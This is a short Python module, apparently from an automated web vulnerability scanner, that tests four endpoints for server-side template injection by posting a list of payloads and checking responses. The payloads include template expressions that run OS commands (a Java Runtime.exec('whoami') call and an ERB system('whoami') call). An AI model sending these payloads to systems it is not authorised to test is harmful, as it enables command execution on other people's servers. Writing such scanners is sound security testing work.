"""
Server-Side Template Injection (SSTI) testing for the Dynamic Analysis Agent.
"""

import requests
from urllib.parse import urljoin

def test_ssti(base_url):
    """
    Test for Server-Side Template Injection vulnerabilities.

    Args:
        base_url (str): Base URL to test

    Returns:
        list: List of detected vulnerabilities
    """
    vulnerabilities = []

    ssti_payloads = [
        "{{7*7}}", "{{config}}", "{{self.__class__.__mro__}}",
        "${7*7}", "${T(java.lang.Runtime).getRuntime().exec('whoami')}",
        "<%= 7*7 %>", "<%= system('whoami') %>",
        "#{7*7}", "#{context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse').addHeader('X-Test', 'test')}"
    ]

    test_endpoints = [
        urljoin(base_url, "/template"),
        urljoin(base_url, "/render"),
        urljoin(base_url, "/ssti"),
        urljoin(base_url, "/eval")
    ]

    for endpoint in test_endpoints:
        for payload in ssti_payloads:
            try:
                params = {"template": payload, "input": payload, "data": payload}
                response = requests.post(endpoint, data={"template": payload}, timeout=5)

                # Check for successful template execution
                if "49" in response.text or "java.lang.Runtime" in response.text or "exec" in response.text:
                    vulnerabilities.append({
                        "type": "Server-Side Template Injection (SSTI)",
                        "endpoint": endpoint,
                        "payload": payload,
                        "method": "POST",
                        "evidence": "Template executed server-side"
                    })

            except requests.RequestException:
                continue

    return vulnerabilities
